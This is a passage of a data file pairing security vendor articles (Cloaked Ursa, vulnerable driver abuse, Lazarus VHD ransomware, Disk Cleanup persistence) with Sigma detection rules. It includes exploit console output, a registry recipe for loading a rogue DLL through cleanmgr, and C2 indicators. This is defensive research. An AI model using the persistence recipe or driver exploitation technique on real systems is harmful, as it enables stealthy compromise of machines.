Counterintelligence Service and CERT.PL. Many of the string decryption functions leverage inline assembly keys (as seen in Figure 9), while the rest retrieve keys from the `.rdata` directory.\n\n```image\nAlt: First (left) and second (right) string decryption function types\nDescription: The image features two blocks of code, likely representing different functions or sections of code related to string decryption or manipulation. The left block processes an array named 'Str', performing bitwise operations and XOR manipulations on its elements. The right block includes a conditional check on 'Str[15]' and also performs similar bitwise operations and assignments. The use of variables and operations suggests that this code is involved in obfuscation techniques, possibly related to malware analysis, as referenced in the accompanying text.\nTranscription: |\n  v2 = *((_QWORD *)Str + 5);\n  v3 = 0i64;\n  for (i = 0i64; i < 0x25; ++i)\n  {\n      Str[i] ^= v2 >> (8 * ((unsigned __int8)i & 7u));\n  }\n  a2[2] = 0i64;\n  a2[3] = 15i64;\n  *(_BYTE *)a2 = 0;\n  sub_14000BB08(a2, Str);\n  v7 = *((_QWORD *)Str + 5);\n  do\n  {\n      Str[v3] ^= v7 >> (8 * ((unsigned __int8)v3 & 7u));\n      ++v3;\n  } while (v3 < 0x25);\n  \n  if (!Str[15])\n  {\n      do\n      {\n          Str[v2] ^= 0x4F47F16B111DB9C5ui64 >> (8 * ((unsigned __int8)v2 & 7u));\n          ++v2;\n      } while (v2 < 0xF);\n      Str[15] = 1;\n  }\n```\n\n*Figure 9. First (left) and second (right) string decryption function types.*\n\nIt’s clear that Cloaked Ursa remains dedicated to identifying legitimate platforms to host their C2 servers, based on their usage of the Microsoft Graph API within these two samples, as well as past reports describing C2 communication via Notion and Google Drive.",
    "sigma_rule": {
      "title": "Suspicious File Creation Activity From Fake Recycle.Bin Folder",
      "id": "cd8b36ac-8e4a-4c2f-a402-a29b8fbd5bca",
      "related": [
        {
          "id": "5ce0f04e-3efc-42af-839d-5b3a543b76c0",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects file write event from/to a fake recycle bin folder that is often used as a staging directory for malware",
      "references": [
        "https://www.mandiant.com/resources/blog/infected-usb-steal-secrets",
        "https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-07-12",
      "modified": "2023-12-11",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|contains": [
              "RECYCLERS.BIN\\",
              "RECYCLER.BIN\\"
            ]
          },
          {
            "TargetFilename|contains": [
              "RECYCLERS.BIN\\",
              "RECYCLER.BIN\\"
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_recycle_bin_fake_exec.yml",
    "id": "894"
  },
  {
    "url": "https://www.elastic.co/security-labs/stopping-vulnerable-driver-attacks",
    "markdown": "# Stopping Vulnerable Driver Attacks\n\n**1 March 2023**\n\nUsing vulnerable drivers to gain kernel mode execution.\n\n---\n\n**Categories:** Security operations, Detection science\n\n## Key takeaways\n\n- Ransomware actors are leveraging vulnerable drivers to tamper with endpoint security products.\n- Elastic Security released 65 YARA rules to detect vulnerable driver abuse.\n- Elastic Endpoint (8.3+) protects users from this threat.\n\n## Background\n\nIn 2018, Gabriel Landau and Joe Desimone presented a talk at Black Hat covering the evolution of kernel mode threats on Windows. The most concerning trend was towards leveraging known good but vulnerable drivers to gain kernel mode execution. We showed this was practical, even with hypervisor mode integrity protection (HVCI) and Windows Hardware Quality Labs (WHQL) signing requirement enabled. At the time, the risk to everyday users was relatively low, as these techniques were mostly leveraged by advanced state actors and top red teams.\n\nFast forward to 2022, and attacks leveraging vulnerable drivers are a growing concern due to a proliferation of open source tools to perform these attacks. Vulnerable drivers have now been used by ransomware to terminate security software before encrypting the system. Organizations can reduce their risk by limiting administrative user permissions. However, it is also imperative for security vendors to protect the user-to-kernel boundary because once an attacker can execute code in the kernel, security tools can no longer effectively protect the host. Kernel access gives attackers free rein to tamper or terminate endpoint security products or inject code into protected processes.\n\nThis post includes a primer on kernel mode attacks, along with Elastic’s recommendations for securing users from kernel attacks leveraging vulnerable drivers.\n\n## Attack flow\n\nThere are a number of flaws in drivers that can allow attackers to gain kernel mode access to fully compromise the system and remain undetected. Some of the most common flaws include granting user mode processes write access to virtual memory, physical memory, or model-specific registers (MSR). Classic buffer overflows and missing bounds checks are also common.\n\nA less common driver flaw is unrestricted handle duplication. While this may seem like innocuous functionality at first glance, handle duplication can be leveraged to gain full kernel code execution by user mode processes. For example, the latest Process Explorer driver by Microsoft exposes such a function.\n\nAn attacker can leverage this vulnerability to duplicate a sensitive handle to raw physical memory present in the System (PID 4) process.\n\n```image\nAlt: Handle to Physical Memory in the System process\nDescription: The image displays a screenshot of the System Properties window, specifically showing the Handles tab. It lists various handles associated with system processes, highlighting the handle for \\\\Device\\PhysicalMemory. This handle is particularly significant as it indicates the access permissions granted, including 'Full control' for the \\\\Device\\PhysicalMemory, which is crucial for discussions about kernel mode access and potential vulnerabilities in driver attacks.\nTranscription: |\n  System (4) Properties\n  \n  General    Statistics    Performance    Threads    Token    Modules\n  GPU        Disk and Network\n  \n  [ ] Hide unnamed handles\n  \n  | Type    | Name                       | Handle | Granted access |\n  | ------- | -------------------------- | ------ | -------------- |\n  | File    | \\Device\\NetBT_Tcpip_{35... | 0x47b0 |                |\n  | Section | \\Device\\PhysicalMemory     | 0x494  | Full control   |\n  | Section | \\Device\\PhysicalMemory     | 0x4a8  | Full control   |\n  | File    | \\Device\\Tcp                | 0x41c  | Write, Read    |\n  | File    | \\Device\\Tcp                | 0x92c  | Write, Read    |\n```\n\n*Handle to Physical Memory in the System process*\n\nAfter obtaining the cr3 value, the attacker can walk the page tables to convert virtual kernel addresses to their associated physical addresses. This grants an arbitrary virtual read/write primitive, which attackers can leverage to easily tamper with kernel data structures or execute arbitrary kernel code. On HVCI-enabled systems, thread control flow can be hijacked to execute arbitrary kernel functions as shown below.\n\n```image\nAlt: Hijacking Threat Flow Control\nDescription: The image depicts a Command Prompt window displaying output from an exploit execution. It shows the results of executing a program called 'procexp_exploit.exe', which attempts to gain access to physical memory through a handle obtained from a driver. Various details are presented, including the handle to physical memory, memory locations, and functions being executed, along with debugging print statements. The output indicates successful memory allocation and execution of kernel functions, highlighting the process of exploiting driver vulnerabilities.\nTranscription: |\n  C:\\Users\\user\\Desktop\\procexp_exploit.exe\n  ProcExp handle opened: hProcExp: 0000000000000009, 0\n  Found remote \\Device\\PhysicalMemory handle: 000000000000004EC\n  Handle to physical memory: hMem: 00000000000000DC, 24\n  Enumerating drivers...\n  [+] Found module: ntfs., address: FFFFF8030D800000, size: 000000000029E000\n  ntfs base: FFFFF8030D7A194\n  G1: FFFFF8037A0A1A94\n  G2: FFFFF8037B2BCF8\n  G3: FFFFF8037A27A272\n  G4: FFFFF8037A27A270\n  G5: FFFFF8037A27A278\n  G6: FFFFF8037A27A270\n  G7: FFFFF8037A27A270\n  G8: FFFFF8037A27A270\n  G9: FFFFF8037A27A270\n  G10: FFFFF8037A27A270\n  All gadgets located\n  Executing kernel function ExAllocatePoolWithTag..\n  Target function addr: FFFFF807D6F010\n  ETHREAD: FFFFFA5A8E6C6E0\n  stack limit: FFFFFA5A8E6C6E0\n  return offset located at: 398\n  exec pre time: 31ms\n  Memory allocated at: FFFFFA4BFEFF8000\n  Executing kernel function DbgPrint..\n  Target function addr: FFFFF807D1B1D30\n  ETHREAD: FFFFFA5A8E6C6E0\n  stack limit: FFFFFA5A8E6C6E0\n  return offset located at: 398\n  exec pre time: 31ms\n  Exploit complete\n  C:\\Users\\user\\Desktop>\n```\n\n*Hijacking Threat Flow Control*\n\nWe reported this issue to Microsoft in the vulnerable driver submission portal on July 26, but as of this writing have not received a response. We hope Microsoft will consider this a serious security issue worth addressing. Ideally, they will release a fixed version without the vulnerable IOCTLs and include it in the default HVCI blocklist. This would be consistent with the blocking of the ProcessHacker (now known as System Informer) driver for the same flaw.\n\n## Blocklisting\nBlocklisting prevents known vulnerable drivers from loading on a system, and is a great first step to the vulnerable driver problem. Blocklisting can raise the cost of kernel attacks to levels out of reach for some criminal groups, while maintaining low false positive rates. The downside is it does not stop more advanced groups, which can identify new, previously-unknown, vulnerable drivers.\n\nMicrosoft maintains a catalog of known exploited or malicious drivers, which should be a minimum baseline. This catalog consists of rules using various combinations of Authenticode hash, certificate hash (also known as TBS), internal file name, and version. The catalog is intended to be used by Windows Defender Application Control (WDAC). We used this catalog as a starting point for a more comprehensive list using the YARA community standard.\n\nTo expand on the existing list of known vulnerable drivers, we pivoted through VirusTotal data with known vulnerable import hashes and other metadata. We also combed through public attack tooling to identify additional vulnerable drivers. As common practice for Elastic Security, we made our blocklist available to the community. In Elastic Endpoint Security version 8.3 and newer, all drivers are validated against the blocklist in-line before they are allowed to load onto the system.\n\n```image\nAlt: enter image description here\nDescription: The image depicts a user interface from a cybersecurity management tool showing an alerts dashboard. It includes a graph indicating alert trends over time, with specific timestamps displayed along the x-axis. There is a section detailing a single alert with characteristics including the rule name, file path of the detected driver (C:\\Windows\\system32\\Drivers\\PROCEXP152.SYS), and reasons for the alert such as 'malware' and 'intrusion'. The interface allows filtering and sorting of alerts, emphasizing its analytical capabilities in monitoring potential threats.\nTranscription: |\n  Alerts\n  Open  Acknowledged  Closed\n  Updated 5 seconds ago\n  \n  Trend\n  Group by  kibana.alert.rule.name\n  Group by top\n  Malware Prevention Alert  1\n  \n  Columns  1 field sorted  1 alert  Fields\n  Actions  @timestamp  rule.name  file.path\n  Aug 2, 2022 @ 11:33:18.392  Windows.VulnDriver.ProcExp  C:\\Windows\\system32\\Drivers\\PROCEXP152.SYS\n  Reason  host.name  user.name\n  malware, intrusion,...  DESKTOP-M...  SYSTEM\n```\n\n*enter image description here*\n\n## Allowlisting\nOne of the most robust defenses against this driver threat is to only allow the combination of driver signer, internal file name, version, and/or hashes, which are known to be in use. We recommend organizations be as strict as feasible. For example, do not blanket trust all WHQL signed drivers. This is the classic application control method, albeit focusing on drivers. An organization’s diversity of drivers should be more manageable than the entirety of user mode applications. Windows Defender Application Control (WDAC) is a powerful built-in feature that can be configured this way. However, the learning curve and maintenance costs may still be too high for organizations without well-staffed security teams. To reap most of the benefits of the allowlisting approach, but reduce the cost of implementation to the users (ideally to blocklisting levels), we recommend two approaches in tandem: behavior control and alert on first seen.\n\n## Behavior control\nThe concept behind behavior control is to produce a more manageable set of allowlistable behavior choke points that can be tuned for high confidence. For example, we can create a behavior control around which applications are allowed to write drivers to disk. This may start with a relatively loose and simple rule:\n\n```image\nAlt: Example EQL Query\nDescription: The image depicts an example of an Event Query Language (EQL) query designed to detect potentially malicious driver activities. It consists of a sequence of conditions for events related to file actions and driver loads, specifically filtering for system files with certain characteristics. Below the query, there are details of relevant events captured, including timestamps, event categories (file and driver), event actions (creation and load), and information about the involved processes and files.\nTranscription: |\n  EQL query\n  sequence\n  [file where event.action != \"deletion\" and\n  (file.Extension == \"sys\" or file.Ext.header_bytes : \"4d5a*\") and\n  (process.code_signature.trusted == false or process.code_signature.exists == false)] by file.path\n  \n  @timestamp          message                                      event.category   event.action\n  Aug 29, 2022 10:54:54.994  Endpoint file event                     file            creation\n                          user          DESKTOP-MNVAK7T          created a file  NalDrv.sys\n                          path          C:\\Users\\user\\Desktop\\KDU-1.2.0\\Bin\\NalDrv.sys  via kdu.exe (7664)\n  \n  Aug 29, 2022 10:54:55.097  Endpoint driver load event               driver          load\n                          SYSTEM        NT AUTHORITY            loaded library   via .System (4)\n```\n\n*Example EQL Query*\n\nFrom there, we can allowlist the benign applications that are known to exhibit this behavior. Then we receive and triage hits, tune the rule until it becomes high confidence, and then ship as part of our malicious behavior protection. Elastic SIEM users can use the same technique to create custom Detection Engine rules tuned specifically for their environment.\n\n## First seen\nElastic Security in 8.4 adds another powerful tool that can be used to identify suspicious drivers. This is the “New Terms” rule type, which can be used to create an alert when a term (driver hash, signer, version, internal file name, etc) is observed for the first time.\n\n```image\nAlt: First Seen\nDescription: The image depicts a user interface from a cybersecurity application, specifically focusing on the definition of a new rule type called 'New Terms.' It highlights options for setting up the rule, including selecting index patterns, entering a custom query related to event categories for drivers, and specifying fields to check for new terms. The rule allows users to identify documents with values appearing for the first time, which is crucial for detecting suspicious driver activities.\nTranscription: |\n  Definition\n  \n  Rule type\n  New Terms\n  Find documents with values appearing for the first time.\n  Selected\n  \n  Source\n  Use Kibana Data Views or specify individual index patterns as your rule's data source to be searched.\n  Index Patterns  Data View\n  Reset to default index patterns\n  \n  logs-*  *\n  Enter the pattern of Elasticsearch indices where you would like this rule to run. By default, these will include index patterns defined in Security Solution advanced settings.\n  \n  Custom query\n  event.category: \"driver\"\n  \n  Fields\n  dll.pe.imphash\n  Select a field to check for new terms.\n  \n  History Window Size\n  7 Days\n  New terms rules only alert if terms don't appear in historical data.\n```\n\n*First Seen*\n\nThis empowers security teams to quickly surface unusual drivers the first time they’re seen in their environment. This supports a detection opportunity for even previously unknown vulnerable drivers or other driver-based adversary tradecraft.\n\n```image\nAlt: Visualizing It\nDescription: The image displays a screenshot from a security alert dashboard, likely from Kibana, showing the trend of alerts related to a driver identified by the rule 'First Seen Driver IMPHASH'. The graph indicates the occurrence of alerts over a specific time period on August 2, 2022, highlighting a spike in alerts at noon. Below the graph, there are columns indicating details about the alert, including a timestamp, rule name, and information about the driver such as its hash and version. This visual representation is used to monitor and analyze suspicious driver behavior.\nTranscription: |\n  Alerts\n  Open  Acknowledged  Closed\n  Updated 8 seconds ago\n  \n  Trend\n  Group by  kibana.alert.rule.name\n  Group by top\n  \n  First Seen Driver IMPHASH\n  \n  Actions\n  @timestamp                     Rule\n  Aug 2, 2022 @ 11:55:58.123    First Seen Driver IMPHASH\n                                 dll.pe.imphash\n                                 bd093a7d5ba5632e25f3466a6...\n                                 4.8.2.0\n                                 HW.sys\n                                 hw_6a4875ae860...\n                                 driver ev\n```\n\n*Visualizing It*\n\n## Conclusion\n\nVulnerable driver exploitation, once relegated to advanced adversaries, has now proliferated to the point of being used in ransomware attacks. The time for the security community to come together and act on this problem is now. We can start raising the cost by collaborating on blocklists as a community. We should also investigate additional detection strategies such as behavior control and anomaly detection to raise the cost further without requiring significant security expertise or resources to achieve.",
    "sigma_rule": {
      "title": "Process Explorer Driver Creation By Non-Sysinternals Binary",
      "id": "de46c52b-0bf8-4936-a327-aace94f94ac6",
      "status": "test",
      "description": "Detects creation of the Process Explorer drivers by processes other than Process Explorer (procexp) itself.\nHack tools or malware may use the Process Explorer driver to elevate privileges, drops it to disk for a few moments, runs a service using that driver and removes it afterwards.\n",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer",
        "https://github.com/Yaxser/Backstab",
        "https://www.elastic.co/security-labs/stopping-vulnerable-driver-attacks",
        "https://news.sophos.com/en-us/2023/04/19/aukill-edr-killer-malware-abuses-process-explorer-driver/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2023-05-05",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1068"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": "\\PROCEXP",
          "TargetFilename|endswith": ".sys"
        },
        "filter_main_process_explorer": {
          "Image|endswith": [
            "\\procexp.exe",
            "\\procexp64.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Some false positives may occur with legitimate renamed process explorer binaries"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_sysinternals_procexp_driver_susp_creation.yml",
    "id": "900"
  },
  {
    "url": "https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/",
    "markdown": "# Lazarus on the hunt for big game\n\n**APT reports** \n**28 Jul 2020** \n\n---\n\nWe may only be six months in, but there’s little doubt that 2020 will go down in history as a rather unpleasant year. In the field of cybersecurity, the collective hurt mostly crystallized around the increasing prevalence of targeted ransomware attacks. By investigating a number of these incidents and through discussions with some of our trusted industry partners, we feel that we now have a good grasp on how the ransomware ecosystem is structured.\n\n[Image Details:\n**Alt Text**: Structure of the ransomware ecosystem\n**Description**: The image depicts a flowchart illustrating the structure of the ransomware ecosystem. It features various roles involved in ransomware operations, including 'Developers' who provide the ransomware, 'Packers,' 'Botmaster' who provides initial access, 'Red Team,' 'Support,' 'Analysts' who study stolen documents, and 'Launderers' who cash out the Bitcoins. Arrows indicate the relationships and interactions between these roles, highlighting the complex, interconnected nature of ransomware activities.\n**Transcription**:\nDevelopers\n   Provide the ransomware\nPackers\n\nBotmaster\n   Provides the initial access\n       |\n   Red Team\n       |\n   Transfers handling\n       |\n   Support\n       |\n   Launderers\n   Cash out the Bitcoins\n\nAnalysts\n   Study stolen documents]\n\n**_Structure of the ransomware ecosystem_**\n\nCriminals piggyback on widespread botnet infections (for instance, the infamous Emotet and Trickbot malware families) to spread into the network of promising victims and license ransomware “products” from third-party developers. When the attackers have a good understanding of the target’s finances and IT processes, they deploy the ransomware on all the company’s assets and enter the negotiation phase.\n\nThis ecosystem operates in independent, highly specialized clusters, which in most cases have no links to each other beyond their business ties. This is why the concept of threat actors gets fuzzy: the group responsible for the initial breach is unlikely to be the party that compromised the victim’s Active Directory server, which in turn is not the one that wrote the actual ransomware code used during the incident. What’s more, over the course of two incidents, the same criminals may switch business partners and could be leveraging different botnet and/or ransomware families altogether.\n\nBut of course, no complex ecosystem could ever be described by a single, rigid set of rules and this one is no exception. In this blog post, we describe one of these outliers over two separate investigations that occurred between March and May 2020.\n\n## Case #1: The VHD ransomware\n\nThis first incident occurred in Europe and caught our attention for two reasons: it features a ransomware family we were unaware of, and involved a spreading technique reminiscent of APT groups (see the “spreading utility” details below). The ransomware itself is nothing special: it’s written in C++ and crawls all connected disks to encrypt files and delete any folder called “System Volume Information” (which are linked to Windows’ restore point feature). The program also stops processes that could be locking important files, such as Microsoft Exchange and SQL Server. Files are encrypted with a combination of AES-256 in ECB mode and RSA-2048. In our initial report published at the time we noted two peculiarities with this program’s implementation:\n\n- The ransomware uses Mersenne Twister as a source of randomness, but unfortunately for the victims the RNG is reseeded every time new data is consumed. Still, this is unorthodox cryptography, as is the decision to use the “electronic codebook” (ECB) mode for the AES algorithm. The combination of ECB and AES is not semantically secure, which means the patterns of the original clear data are preserved upon encryption. This was reiterated by cybersecurity researchers who analyzed Zoom security in April 2020.\n- VHD implements a mechanism to resume operations if the encryption process is interrupted. For files larger than 16MB, the ransomware stores the current cryptographic materials on the hard drive, in clear text. This information is not deleted securely afterwards, which implies there may be a chance to recover some of the files.\n\n[Image Details:\n**Alt Text**: The Mersenne Twister RNG is reseeded every time it is called.\n**Description**: The image is a snippet of code in a programming language, likely C++, that illustrates the implementation of the Mersenne Twister random number generator (RNG). It shows a function that initializes the RNG with a seed value obtained from a random device, and includes a loop that modifies the seed for further randomness. The code also contains comments indicating specific operations and memory references, which provide insights into how the RNG is structured and operates within the larger context of the VHD ransomware.\n**Transcription**:\ncpp\nunsigned int __stdcall mersenne_twister(int min, int max)\n{\n    int seed; // eax\n    unsigned int seed_i; // ecx\n    int i; // eax\n    int v6; // [esp+8h] [ebp-18h] BYREF\n    int v7[124]; // [esp+Ch] [ebp-138h]\n    int v8; // [esp+138h] [ebp-Ch]\n    \n    seed = std::tr1::Random_device();\n    v7[0] = seed;\n    seed = seed;\n    v8 = -1;\n    for (i = 1; i < 624; ++i)\n    {\n        seed = i + 0x6C078965 ^ ((seed >> 30) ^ seed_);\n        v7[i] = seed_;\n    }\n    v6 = 624;\n    return mersenne_twister_get_next(min, max, (int)&v6);\n}]\n\n**_The Mersenne Twister RNG is reseeded every time it is called._**\n\nTo the best of our knowledge, this malware family was first discussed publicly in this blog post.\n\nA spreading utility, discovered along the ransomware, propagated the program inside the network. It contained a list of administrative credentials and IP addresses specific to the victim, and leveraged them to brute-force the SMB service on every discovered machine. Whenever a successful connection was made, a network share was mounted, and the VHD ransomware was copied and executed through WMI calls. This stood out to us as an uncharacteristic technique for cybercrime groups; instead, it reminded us of the APT campaigns Sony SPE, Shamoon, and OlympicDestroyer, three previous wipers with worming capabilities.\n\nWe were left with more questions than answers. We felt that this attack did not fit the usual _modus operandi_ of known big-game hunting groups. In addition, we were only able to find a very limited number of VHD ransomware samples in our telemetry, and a few public references. This indicated that this ransomware family might not be traded widely on dark market forums, as would usually be the case.\n\n## Case #2: Hakuna MATA\n\nA second incident, two months later, was handled by Kaspersky’s Incident Response team (GERT). That meant we were able to get a complete picture of the infection chain leading to the installation of the VHD ransomware.\n\n[Image Details:\n**Alt Text**: Hakuna MATA\n**Description**: The image is a flowchart illustrating the infection chain related to the VHD ransomware incident associated with the Lazarus group. It includes five key stages: 1) Initial Intrusion via VPN gateway exploitation, 2) Internal foothold and privilege escalation involving technical exploitation and deployment of tools, 3) Reconnaissance and credential stealing focusing on Active Directory and running processes, 4) Lateral movement using WMI to deploy a downloader, and 5) Action where the VHD ransomware is executed. Each stage is visually connected with arrows, and relevant icons depict the nature of the actions taken.\n**Transcription**:\n1. **Initial Intrusion**  \n   From VPN gateway vulnerability exploitation.\n\n2. **Internal foothold & Privilege escalation**  \n   Exploit technical vulnerability on a server.  \n   Deploy Lazarus-associated tools.  \n   C2 communications.\n\n3. **Reconnaissance & Credentials stealing**  \n   Browse Active Directory.  \n   Dump credentials from running processes.\n\n4. **Lateral movement**  \n   Deploy a downloader with WMI.  \n   Downloader brings ransomware.\n\n5. **Action**  \n   VHD Ransomware is executed.]\n\nIn this instance, we believe initial access was achieved through opportunistic exploitation of a vulnerable VPN gateway. After that, the attackers obtained administrative privileges, deployed a backdoor on the compromised system and were able to take over the Active Directory server. They then deployed the VHD ransomware to all the machines in the network. In this instance, there was no spreading utility, but the ransomware was staged through a downloader written in Python that we still believe to be in development. The whole infection took place over the course of 10 hours.\n\nA more relevant piece of information is that the backdoor used during this incident is an instance of a multiplatform framework we call MATA (some vendors also call it Dacls). On July 22, we published a blog article dedicated to this framework. In it, we provide an in-depth description of its capabilities and provide evidence of its links to the Lazarus group. Other members of the industry independently reached similar conclusions.\n\nThe forensics evidence gathered during the incident response process is strong enough that we feel comfortable stating with a high degree of confidence that there was only a single threat actor in the victim’s network during the time of the incident.\n\n## Conclusion\n\nThe data we have at our disposal tends to indicate that the VHD ransomware is not a commercial off-the-shelf product; and as far as we know, the Lazarus group is the sole owner of the MATA framework. Hence, we conclude that the VHD ransomware is also owned and operated by Lazarus.\n\nCircling back to our introduction, this observation is at odds with what we know about the cybercrime ecosystem. Lazarus has always existed at a special crossroads between APT and financial crime, and there have long been rumors in the threat intelligence community that the group was a client of various botnet services. We can only speculate about the reason why they are now running solo ops: maybe they find it difficult to interact with the cybercrime underworld, or maybe they felt they could no longer afford to share their profits with third parties.\n\nIt’s obvious the group cannot match the efficiency of other cybercrime gangs with their hit-and-run approach to targeted ransomware. Could they really set an adequate ransom price for their victim during the 10 hours it took to deploy the ransomware? Were they even able to figure out where the backups were located? In the end, the only thing that matters is whether these operations turned a profit for Lazarus.\n\nOnly time will tell whether they jump into hunting big game full time, or scrap it as a failed experiment.\n\n## Indicators of compromise\n\n*The spreader utility contains a list of administrative credentials and IP addresses specific to the victim, which is why it’s not listed in the IoC section.*\n\n*As the instance of the MATA framework was extracted from memory, no relevant hashes can be provided for it in the IoC section.*\n\n**VHD ransomware** \n6D12547772B57A6DA2B25D2188451983 \nD0806C9D8BCEA0BD47D80FA004744D7D \nDD00A8610BB84B54E99AE8099DB1FC20 \nCCC6026ACF7EADADA9ADACCAB70CA4D6 \nEFD4A87E7C5DCBB64B7313A13B4B1012\n\n**Domains and IPs** \n172.93.184[.]62 - MATA C2 \n23.227.199[.]69 - MATA C2 \n104.232.71[.]7 - MATA C2 \nmnmski.cafe24[.]com - Staging endpoint for the ransomware (personal web space hosted at a legit web service and used as a redirection to another compromised legit website).",
    "sigma_rule": {
      "title": "VHD Image Download Via Browser",
      "id": "8468111a-ef07-4654-903b-b863a80bbc95",
      "status": "test",
      "description": "Detects creation of \".vhd\"/\".vhdx\" files by browser processes.\nMalware can use mountable Virtual Hard Disk \".vhd\" files to encapsulate payloads and evade security controls.\n",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-october-2021/",
        "https://www.kaspersky.com/blog/lazarus-vhd-ransomware/36559/",
        "https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/"
      ],
      "author": "frack113, Christopher Peacock '@securepeacock', SCYTHE '@scythe_io'",
      "date": "2021-10-25",
      "modified": "2023-05-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\firefox.exe",
            "\\iexplore.exe",
            "\\maxthon.exe",
            "\\MicrosoftEdge.exe",
            "\\msedge.exe",
            "\\msedgewebview2.exe",
            "\\opera.exe",
            "\\safari.exe",
            "\\seamonkey.exe",
            "\\vivaldi.exe",
            "\\whale.exe"
          ],
          "TargetFilename|contains": ".vhd"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate downloads of \".vhd\" files would also trigger this"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_vhd_download_via_browsers.yml",
    "id": "904"
  },
  {
    "url": "https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/",
    "markdown": "# Beyond good ol’ Run key, Part 86\n\nPosted on 2018-09-02\n\nIt is a well-known fact that Windows features are the best persistence mechanisms, and… the one I am going to talk about is yet another one of these…\n\nIf you ever ran into a problem of having not enough space on your hard drive you are certainly familiar with the Disk Cleanup program:\n\n```image\nAlt: Disk Cleanup\nDescription: The image displays the user interface of the Disk Cleanup tool in Windows. It shows a window titled 'Disk Cleanup for (C:)', indicating that the utility is being used to free up disk space on the C drive. The window lists various types of files that can be deleted, including 'Downloaded Program Files', 'Temporary Internet Files', 'System created Windows Error Reporting...', 'DirectX Shader Cache', and 'Delivery Optimization Files'. Each item includes a checkbox, with the 'Downloaded Program Files' selected, and displays the size of the files that can be deleted. Additionally, there is a summary at the bottom indicating the total amount of disk space that can be gained, which is currently 0 bytes. At the bottom, there are buttons for 'Clean up system files', 'View Files', 'OK', and 'Cancel'.\nTranscription: |\n  Disk Cleanup for (C:)\n  \n  Disk Cleanup\n  You can use Disk Cleanup to free up to 8.62 MB of disk space on (C:).\n  \n  Files to delete:\n  - [x] Downloaded Program Files                     0 bytes\n  - [x] Temporary Internet Files                     0 bytes\n  - [ ] System created Windows Error Reporting...    15.9 KB\n  - [ ] DirectX Shader Cache                         0 bytes\n  - [ ] Delivery Optimization Files                  8.52 MB\n  \n  Total amount of disk space you gain:               0 bytes\n  \n  Description:\n  Downloaded Program Files are ActiveX controls and Java applets downloaded automatically from the Internet when you view certain pages. They are temporarily stored in the Downloaded Program Files folder on your hard disk.\n  \n  [Clean up system files]       [View Files]\n  [OK]                          [Cancel]\n```\n\nIt turns out that the list of the ‘Files to delete’ that we see on the GUI is not random. It is pulled from this Registry node:\n\n- HKLM\\SOFTWARE\\Microsoft\\Windows\\\n  CurrentVersion\\Explorer\\\n  VolumeCaches\n\n```image\nAlt: Disk Cleanup Registry\nDescription: The image displays a screenshot of the Windows Registry Editor, specifically showing the path HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\Downloaded Program Files. It features a structured list of keys and values related to the Downloaded Program Files, including entries like '(Default)', 'AdvancedButtonText', 'Autorun', 'Description', 'Display', and 'Priority'. Each entry is accompanied by its data type (e.g., REG_SZ, REG_DWORD, REG_BINARY) and corresponding data values, demonstrating various configurations tied to the Disk Cleanup functionality.\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\Downloaded Program Files\n  \n  Name                          Type         Data\n  (Default)                     REG_SZ       (8369AB20-56C9-11D0-94E8-00AA0059CE02)\n  AdvancedButtonText            REG_SZ       C:\\Windows\\System32\\occache.dll,-1072\n  Autorun                       REG_DWORD    0x00000001 (1)\n  Description                   REG_SZ       C:\\Windows\\System32\\occache.dll,-1071\n  Display                       REG_SZ       C:\\Windows\\System32\\occache.dll,-1070\n  Priority                      REG_BINARY   64 00 00 00\n```\n\nSo, it would seem the list is dynamic and we can add entries to it.\n\nIndeed.\n\nThe process is actually well-documented in this Microsoft’s article: Registering a Disk Cleanup Handler.\n\nSo, adding these entries:\n\n- HKLM\\SOFTWARE\\Microsoft\\Windows\\\n  CurrentVersion\\Explorer\\VolumeCaches\\\n  BadGuy=<BADCLSID>\n- HKCR\\CLSID\\<BADCLSID>\\\n  InProcServer32 = <BADDLL>\n\nwill launch the BADDLL anytime Clean Manager tool is launched. Notably, the GUI won’t show the BadGuy entry (unless additional required Registry entries are populated – refer to the information in the Microsoft article I provided the link to)!\n\nIn my previous post I speculated that in some cases it is possible to design LOLbinish persistence mechanisms. We can start by adding e.g. Run key pointing to a legitimate OS binary and then ensure that when it’s launched during logon process it will run the second stage of the persistence mechanism. The Werfault program was a good example, and the Disk Cleanup program falls into this category as well!\n\nThe executable that launches the Disk Cleanup is called cleanmgr.exe. Adding it to run during the start-up may not be the best idea, because it has a GUI, but… there are always command line arguments of this program that we can use e.g.\n\n- /autoclean\n- /setup\n\nIndeed, adding ‘cleanmgr /autoclean’ to ‘cleanmgr /setup’ to the ‘typical’ start-up place e.g. Run key will ensure that there is no GUI when the cleanmgr.exe is launched, and in a background, the plug-ins are loaded as well. Including the bad 